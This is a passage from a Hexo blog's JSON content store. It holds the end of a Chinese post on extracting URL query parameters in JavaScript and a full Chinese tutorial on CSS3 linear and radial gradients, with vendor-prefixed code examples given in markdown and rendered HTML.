`https://www.baidu.com/s?ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=1`，</span></span><br><span class=\"line\"><span class=\"comment\">// 则截取到的参数部分为：`ie=utf-8&amp;f=3&amp;rsv_bp=1&amp;rsv_idx=1`。</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>获取指定 <code>Url</code> 参数的方法</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">GetUrlParam</span>(<span class=\"params\">paraName</span>) </span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">var</span> url = <span class=\"built_in\">document</span>.location.toString();</span><br><span class=\"line\"><span class=\"keyword\">var</span> arrObj = url.split(<span class=\"string\">\"?\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (arrObj.length &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> arrPara = arrObj[<span class=\"number\">1</span>].split(<span class=\"string\">\"&amp;\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> arr;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; arrPara.length; i++) &#123;</span><br><span class=\"line\">    arr = arrPara[i].split(<span class=\"string\">\"=\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (arr != <span class=\"literal\">null</span> &amp;&amp; arr[<span class=\"number\">0</span>] == paraName) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> arr[<span class=\"number\">1</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 调用方法：GetUrlParam(\"id\");</span></span><br><span class=\"line\"><span class=\"comment\">// 假如当网页的网址有这样的参数 `test.htm?id=896&amp;s=q&amp;p=5`，则调用 `GetUrlParam(\"p\")`，返回 5。</span></span><br></pre></td></tr></table></figure></li>\n</ol>\n"},{"id":"0809002","title":"CSS3 渐变","date":"2016-09-12T10:58:38.000Z","_content":"\n#### CSS3 定义了两种类型的渐变（gradients）：\n\n1. 线性渐变（Linear Gradients）- 向下/向上/向左/向右/对角方向\n2. 径向渐变（Radial Gradients）- 由它们的中心定义\n#### 注意： IE 9 及之前的版本不支持渐变。\n### 线性渐变：\n- `background: linear-gradient(direction, color-stop1, color-stop2, ...);`\n#### 1. 线性渐变 - 从上到下（默认情况下）:\n```css\n.box {\n  background: -webkit-linear-gradient(red, blue);   /* Safari 5.1 - 6.0 */\n  background: -o-linear-gradient(red, blue);        /* Opera 11.1 - 12.0 */\n  background: -moz-linear-gradient(red, blue);      /* Firefox 3.6 - 15 */\n  background: linear-gradient(red, blue);           /* 标准的语法(必须放在最后) */\n}\n```\n效果图 ![效果图](/images/gradient/渐变1.png)\n#### 2. 线性渐变 - 从左到右\n```css\n.box {\n    height: 50px;\n    background: -webkit-linear-gradient(left, red , blue);\n    background: -o-linear-gradient(right, red, blue);\n    background: -moz-linear-gradient(right, red, blue);\n    background: linear-gradient(to right, red , blue);\n}\n```\n效果图 ![效果图](/images/gradient/渐变2.png)\n#### 3. 重复的线性渐变\n```css\n.box {\n    height: 100px;\n    width: 100px;\n    background: -webkit-repeating-linear-gradient(red, yellow 10%, green 20%);  \n    background: -o-repeating-linear-gradient(red, yellow 10%, green 20%);       \n    background: -moz-repeating-linear-gradient(red, yellow 10%, green 20%);  \n    background: repeating-linear-gradient(red, yellow 10%, green 20%);    \n}\n```\n效果图 ![效果图](/images/gradient/渐变3.png)\n#### 4. 线性渐变进阶\n```css\n.box{\n    height: 100px;\n    width: 100px;\n    background: -webkit-linear-gradient(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);\n    background: -o-linear-gradient(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);\n    background: -moz-linear-gradient(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);\n    background: linear-gradient(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);\n}\n```\n效果图 ![效果图](/images/gradient/0deg.png)\n\n没错，就是通过角度来空值渐变的起始位置：\n- 45deg 效果图 ![效果图](/images/gradient/45deg.png)\n- 90deg 效果图 ![效果图](/images/gradient/90deg.png)\n- 135deg 效果图 ![效果图](/images/gradient/135deg.png)\n\n*由此，我们知道了起始可以通过角度来获得我们想要的线性渐变的各种效果了，这基本能满足我们大多数的需求了。*\n径向渐变\n- `background: radial-gradient(center, shape size, start-color, ..., last-color);`\n1. 径向渐变由它的中心定义。\n2. 为了创建一个径向渐变，你也必须至少定义两种颜色结点。颜色结点即你想要呈现平稳过渡的颜色。同时，你也可以指定渐变的中心、形状（原型或椭圆形）、大小。默认情况下，渐变的中心是 center（表示在中心点），渐变的形状是 ellipse（表示椭圆形），渐变的大小是 farthest-corner（表示到最远的角落）。\n#### 1. 普通的径向渐变\n```css\n.box {\n    height: 100px;\n    width: 100px;\n    background: -webkit-radial-gradient(red, green, blue);  \n    background: -o-radial-gradient(red, green, blue);\n    background: -moz-radial-gradient(red, green, blue);  \n    background: radial-gradient(red, green, blue);    \n}\n```\n- 效果图 ![效果图](/images/gradient/径向渐变1.png)\n#### 2. 不均匀的径向渐变\n```css\n.box {\n  background: -webkit-radial-gradient(red 5%, green 15%, blue 60%);     \n  background: -o-radial-gradient(red 5%, green 15%, blue 60%);\n  background: -moz-radial-gradient(red 5%, green 15%, blue 60%);     \n  background: radial-gradient(red 5%, green 15%, blue 60%);\n}\n```\n- 效果图 ![效果图](/images/gradient/径向渐变2.png)\n**径向渐变容器如果不为正方形，则渐变区域会默认呈现为椭圆，若为正方形，则会呈现为正方形。**\n#### 3.不同尺寸的径向渐变\n- closest-side\n- farthest-side\n- closest-corner\n- farthest-corner\n```css\n.box {\n    background: -webkit-radial-gradient(70% 50%, closest-side,red,green,blue);     \n    background: -o-radial-gradient(70% 50%, closest-side,red,green,blue);\n    background: -moz-radial-gradient(70% 50%, closest-side,red,green,blue);     \n    background: radial-gradient(70% 50%, closest-side,red,green,blue);       \n}\n```\n- 效果图 ![效果图](/images/gradient/径向渐变3.png)\n1.  从上面的效果图中可以看出径向渐变的渐变原点的作用\n2. 通过设置尺寸属性可以改变其大小\n#### 4.重复的径向渐变\n```css\n.box {\n    height: 100px;\n    width: 100px;\n    background: -webkit-repeating-radial-gradient(red, yellow 10%, green 15%);  \n    background: -o-repeating-radial-gradient(red, yellow 10%, green 15%);\n    background: -moz-repeating-radial-gradient(red, yellow 10%, green 15%);  \n    background: repeating-radial-gradient(red, yellow 10%, green 15%);    \n}\n```\n- 效果图 ![效果图](/images/gradient/径向渐变4.png)\n","source":"_posts/0809002_CSS3 渐变.md","raw":"---\nid: 0809002\ntitle: CSS3 渐变\ndate: 2016-09-12 18:58:38\ntags:\n    - CSS3\ncategories:\n---\n\n#### CSS3 定义了两种类型的渐变（gradients）：\n\n1. 线性渐变（Linear Gradients）- 向下/向上/向左/向右/对角方向\n2. 径向渐变（Radial Gradients）- 由它们的中心定义\n#### 注意： IE 9 及之前的版本不支持渐变。\n### 线性渐变：\n- `background: linear-gradient(direction, color-stop1, color-stop2, ...);`\n#### 1. 线性渐变 - 从上到下（默认情况下）:\n```css\n.box {\n  background: -webkit-linear-gradient(red, blue);   /* Safari 5.1 - 6.0 */\n  background: -o-linear-gradient(red, blue);        /* Opera 11.1 - 12.0 */\n  background: -moz-linear-gradient(red, blue);      /* Firefox 3.6 - 15 */\n  background: linear-gradient(red, blue);           /* 标准的语法(必须放在最后) */\n}\n```\n效果图 ![效果图](/images/gradient/渐变1.png)\n#### 2. 线性渐变 - 从左到右\n```css\n.box {\n    height: 50px;\n    background: -webkit-linear-gradient(left, red , blue);\n    background: -o-linear-gradient(right, red, blue);\n    background: -moz-linear-gradient(right, red, blue);\n    background: linear-gradient(to right, red , blue);\n}\n```\n效果图 ![效果图](/images/gradient/渐变2.png)\n#### 3. 重复的线性渐变\n```css\n.box {\n    height: 100px;\n    width: 100px;\n    background: -webkit-repeating-linear-gradient(red, yellow 10%, green 20%);  \n    background: -o-repeating-linear-gradient(red, yellow 10%, green 20%);       \n    background: -moz-repeating-linear-gradient(red, yellow 10%, green 20%);  \n    background: repeating-linear-gradient(red, yellow 10%, green 20%);    \n}\n```\n效果图 ![效果图](/images/gradient/渐变3.png)\n#### 4. 线性渐变进阶\n```css\n.box{\n    height: 100px;\n    width: 100px;\n    background: -webkit-linear-gradient(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);\n    background: -o-linear-gradient(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);\n    background: -moz-linear-gradient(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);\n    background: linear-gradient(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);\n}\n```\n效果图 ![效果图](/images/gradient/0deg.png)\n\n没错，就是通过角度来空值渐变的起始位置：\n- 45deg 效果图 ![效果图](/images/gradient/45deg.png)\n- 90deg 效果图 ![效果图](/images/gradient/90deg.png)\n- 135deg 效果图 ![效果图](/images/gradient/135deg.png)\n\n*由此，我们知道了起始可以通过角度来获得我们想要的线性渐变的各种效果了，这基本能满足我们大多数的需求了。*\n径向渐变\n- `background: radial-gradient(center, shape size, start-color, ..., last-color);`\n1. 径向渐变由它的中心定义。\n2. 为了创建一个径向渐变，你也必须至少定义两种颜色结点。颜色结点即你想要呈现平稳过渡的颜色。同时，你也可以指定渐变的中心、形状（原型或椭圆形）、大小。默认情况下，渐变的中心是 center（表示在中心点），渐变的形状是 ellipse（表示椭圆形），渐变的大小是 farthest-corner（表示到最远的角落）。\n#### 1. 普通的径向渐变\n```css\n.box {\n    height: 100px;\n    width: 100px;\n    background: -webkit-radial-gradient(red, green, blue);  \n    background: -o-radial-gradient(red, green, blue);\n    background: -moz-radial-gradient(red, green, blue);  \n    background: radial-gradient(red, green, blue);    \n}\n```\n- 效果图 ![效果图](/images/gradient/径向渐变1.png)\n#### 2. 不均匀的径向渐变\n```css\n.box {\n  background: -webkit-radial-gradient(red 5%, green 15%, blue 60%);     \n  background: -o-radial-gradient(red 5%, green 15%, blue 60%);\n  background: -moz-radial-gradient(red 5%, green 15%, blue 60%);     \n  background: radial-gradient(red 5%, green 15%, blue 60%);\n}\n```\n- 效果图 ![效果图](/images/gradient/径向渐变2.png)\n**径向渐变容器如果不为正方形，则渐变区域会默认呈现为椭圆，若为正方形，则会呈现为正方形。**\n#### 3.不同尺寸的径向渐变\n- closest-side\n- farthest-side\n- closest-corner\n- farthest-corner\n```css\n.box {\n    background: -webkit-radial-gradient(70% 50%, closest-side,red,green,blue);     \n    background: -o-radial-gradient(70% 50%, closest-side,red,green,blue);\n    background: -moz-radial-gradient(70% 50%, closest-side,red,green,blue);     \n    background: radial-gradient(70% 50%, closest-side,red,green,blue);       \n}\n```\n- 效果图 ![效果图](/images/gradient/径向渐变3.png)\n1.  从上面的效果图中可以看出径向渐变的渐变原点的作用\n2. 通过设置尺寸属性可以改变其大小\n#### 4.重复的径向渐变\n```css\n.box {\n    height: 100px;\n    width: 100px;\n    background: -webkit-repeating-radial-gradient(red, yellow 10%, green 15%);  \n    background: -o-repeating-radial-gradient(red, yellow 10%, green 15%);\n    background: -moz-repeating-radial-gradient(red, yellow 10%, green 15%);  \n    background: repeating-radial-gradient(red, yellow 10%, green 15%);    \n}\n```\n- 效果图 ![效果图](/images/gradient/径向渐变4.png)\n","slug":"0809002_CSS3 渐变","published":1,"updated":"2018-03-16T10:34:07.661Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjfhshvvj0026s4c0st8pdzjn","content":"<h4 id=\"CSS3-定义了两种类型的渐变（gradients）：\"><a href=\"#CSS3-定义了两种类型的渐变（gradients）：\" class=\"headerlink\" title=\"CSS3 定义了两种类型的渐变（gradients）：\"></a>CSS3 定义了两种类型的渐变（gradients）：</h4><ol>\n<li>线性渐变（Linear Gradients）- 向下/向上/向左/向右/对角方向</li>\n<li>径向渐变（Radial Gradients）- 由它们的中心定义<h4 id=\"注意：-IE-9-及之前的版本不支持渐变。\"><a href=\"#注意：-IE-9-及之前的版本不支持渐变。\" class=\"headerlink\" title=\"注意： IE 9 及之前的版本不支持渐变。\"></a>注意： IE 9 及之前的版本不支持渐变。</h4><h3 id=\"线性渐变：\"><a href=\"#线性渐变：\" class=\"headerlink\" title=\"线性渐变：\"></a>线性渐变：</h3></li>\n</ol>\n<ul>\n<li><code>background: linear-gradient(direction, color-stop1, color-stop2, ...);</code><h4 id=\"1-线性渐变-从上到下（默认情况下）\"><a href=\"#1-线性渐变-从上到下（默认情况下）\" class=\"headerlink\" title=\"1. 线性渐变 - 从上到下（默认情况下）:\"></a>1. 线性渐变 - 从上到下（默认情况下）:</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-linear-gradient</span>(red, blue);   <span class=\"comment\">/* Safari 5.1 - 6.0 */</span></span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-linear-gradient</span>(red, blue);        <span class=\"comment\">/* Opera 11.1 - 12.0 */</span></span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-linear-gradient</span>(red, blue);      <span class=\"comment\">/* Firefox 3.6 - 15 */</span></span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">linear-gradient</span>(red, blue);           <span class=\"comment\">/* 标准的语法(必须放在最后) */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>效果图 <img src=\"/images/gradient/渐变1.png\" alt=\"效果图\"></p>\n<h4 id=\"2-线性渐变-从左到右\"><a href=\"#2-线性渐变-从左到右\" class=\"headerlink\" title=\"2. 线性渐变 - 从左到右\"></a>2. 线性渐变 - 从左到右</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">50px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-linear-gradient</span>(left, red , blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-linear-gradient</span>(right, red, blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-linear-gradient</span>(right, red, blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">linear-gradient</span>(to right, red , blue);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果图 <img src=\"/images/gradient/渐变2.png\" alt=\"效果图\"></p>\n<h4 id=\"3-重复的线性渐变\"><a href=\"#3-重复的线性渐变\" class=\"headerlink\" title=\"3. 重复的线性渐变\"></a>3. 重复的线性渐变</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-repeating-linear-gradient</span>(red, yellow 10%, green 20%);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-repeating-linear-gradient</span>(red, yellow 10%, green 20%);       </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-repeating-linear-gradient</span>(red, yellow 10%, green 20%);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">repeating-linear-gradient</span>(red, yellow 10%, green 20%);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果图 <img src=\"/images/gradient/渐变3.png\" alt=\"效果图\"></p>\n<h4 id=\"4-线性渐变进阶\"><a href=\"#4-线性渐变进阶\" class=\"headerlink\" title=\"4. 线性渐变进阶\"></a>4. 线性渐变进阶</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span>&#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-linear-gradient</span>(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-linear-gradient</span>(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-linear-gradient</span>(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">linear-gradient</span>(0deg,#FF0000 0%,#00FF00 50%,#0000FF 100%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>效果图 <img src=\"/images/gradient/0deg.png\" alt=\"效果图\"></p>\n<p>没错，就是通过角度来空值渐变的起始位置：</p>\n<ul>\n<li>45deg 效果图 <img src=\"/images/gradient/45deg.png\" alt=\"效果图\"></li>\n<li>90deg 效果图 <img src=\"/images/gradient/90deg.png\" alt=\"效果图\"></li>\n<li>135deg 效果图 <img src=\"/images/gradient/135deg.png\" alt=\"效果图\"></li>\n</ul>\n<p><em>由此，我们知道了起始可以通过角度来获得我们想要的线性渐变的各种效果了，这基本能满足我们大多数的需求了。</em><br>径向渐变</p>\n<ul>\n<li><code>background: radial-gradient(center, shape size, start-color, ..., last-color);</code></li>\n</ul>\n<ol>\n<li>径向渐变由它的中心定义。</li>\n<li>为了创建一个径向渐变，你也必须至少定义两种颜色结点。颜色结点即你想要呈现平稳过渡的颜色。同时，你也可以指定渐变的中心、形状（原型或椭圆形）、大小。默认情况下，渐变的中心是 center（表示在中心点），渐变的形状是 ellipse（表示椭圆形），渐变的大小是 farthest-corner（表示到最远的角落）。<h4 id=\"1-普通的径向渐变\"><a href=\"#1-普通的径向渐变\" class=\"headerlink\" title=\"1. 普通的径向渐变\"></a>1. 普通的径向渐变</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-radial-gradient</span>(red, green, blue);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-radial-gradient</span>(red, green, blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-radial-gradient</span>(red, green, blue);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">radial-gradient</span>(red, green, blue);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li><p>效果图 <img src=\"/images/gradient/径向渐变1.png\" alt=\"效果图\"></p>\n<h4 id=\"2-不均匀的径向渐变\"><a href=\"#2-不均匀的径向渐变\" class=\"headerlink\" title=\"2. 不均匀的径向渐变\"></a>2. 不均匀的径向渐变</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-radial-gradient</span>(red 5%, green 15%, blue 60%);     </span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-radial-gradient</span>(red 5%, green 15%, blue 60%);</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-radial-gradient</span>(red 5%, green 15%, blue 60%);     </span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">radial-gradient</span>(red 5%, green 15%, blue 60%);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>效果图 <img src=\"/images/gradient/径向渐变2.png\" alt=\"效果图\"><br><strong>径向渐变容器如果不为正方形，则渐变区域会默认呈现为椭圆，若为正方形，则会呈现为正方形。</strong></p>\n<h4 id=\"3-不同尺寸的径向渐变\"><a href=\"#3-不同尺寸的径向渐变\" class=\"headerlink\" title=\"3.不同尺寸的径向渐变\"></a>3.不同尺寸的径向渐变</h4></li>\n<li>closest-side</li>\n<li>farthest-side</li>\n<li>closest-corner</li>\n<li><p>farthest-corner</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-radial-gradient</span>(70% 50%, closest-side,red,green,blue);     </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-radial-gradient</span>(70% 50%, closest-side,red,green,blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-radial-gradient</span>(70% 50%, closest-side,red,green,blue);     </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">radial-gradient</span>(70% 50%, closest-side,red,green,blue);       </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>效果图 <img src=\"/images/gradient/径向渐变3.png\" alt=\"效果图\"></p>\n</li>\n</ul>\n<ol>\n<li>从上面的效果图中可以看出径向渐变的渐变原点的作用</li>\n<li>通过设置尺寸属性可以改变其大小<h4 id=\"4-重复的径向渐变\"><a href=\"#4-重复的径向渐变\" class=\"headerlink\" title=\"4.重复的径向渐变\"></a>4.重复的径向渐变</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-repeating-radial-gradient</span>(red, yellow 10%, green 15%);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-repeating-radial-gradient</span>(red, yellow 10%, green 15%);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-repeating-radial-gradient</span>(red, yellow 10%, green 15%);  </span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">repeating-radial-gradient</span>(red, yellow 10%, green 15%);    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li>效果图 <img src=\"/images/gradient/径向渐变4.png\" alt=\"效果图\"></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"CSS3-定义了两种类型的渐变（gradients）：\"><a href=\"#CSS3-定义了两种类型的渐变（gradients）：\" class=\"headerlink\" title=\"CSS3 定义了两种类型的渐变（gradients）：\"></a>CSS3 定义了两种类型的渐变（gradients）：</h4><ol>\n<li>线性渐变（Linear Gradients）- 向下/向上/向左/向右/对角方向</li>\n<li>径向渐变（Radial Gradients）- 由它们的中心定义<h4 id=\"注意：-IE-9-及之前的版本不支持渐变。\"><a href=\"#注意：-IE-9-及之前的版本不支持渐变。\" class=\"headerlink\" title=\"注意： IE 9 及之前的版本不支持渐变。\"></a>注意： IE 9 及之前的版本不支持渐变。</h4><h3 id=\"线性渐变：\"><a href=\"#线性渐变：\" class=\"headerlink\" title=\"线性渐变：\"></a>线性渐变：</h3></li>\n</ol>\n<ul>\n<li><code>background: linear-gradient(direction, color-stop1, color-stop2, ...);</code><h4 id=\"1-线性渐变-从上到下（默认情况下）\"><a href=\"#1-线性渐变-从上到下（默认情况下）\" class=\"headerlink\" title=\"1. 线性渐变 - 从上到下（默认情况下）:\"></a>1. 线性渐变 - 从上到下（默认情况下）:</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-linear-gradient</span>(red, blue);   <span class=\"comment\">/* Safari 5.1 - 6.0 */</span></span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-linear-gradient</span>(red, blue);        <span class=\"comment\">/* Opera 11.1 - 12.0 */</span></span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-linear-gradient</span>(red, blue);      <span class=\"comment\">/* Firefox 3.6 - 15 */</span></span><br><span class=\"line\">  <span class=\"attribute\">background</span>: <span class=\"built_in\">linear-gradient</span>(red, blue);           <span class=\"comment\">/* 标准的语法(必须放在最后) */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>效果图 <img src=\"/images/gradient/渐变1.png\" alt=\"效果图\"></p>\n<h4 id=\"2-线性渐变-从左到右\"><a href=\"#2-线性渐变-从左到右\" class=\"headerlink\" title=\"2. 线性渐变 - 从左到右\"></a>2. 线性渐变 - 从左到右</h4><figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.box</span> &#123;</span><br><span class=\"line\">    <span class=\"attribute\">height</span>: <span class=\"number\">50px</span>;</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-webkit-linear-gradient</span>(left, red , blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-o-linear-gradient</span>(right, red, blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">-moz-linear-gradient</span>(right, red, blue);</span><br><span class=\"line\">    <span class=\"attribute\">background</span>: <span class=\"built_in\">linear-gradient</span>(to right, red , blue);</span><br><span 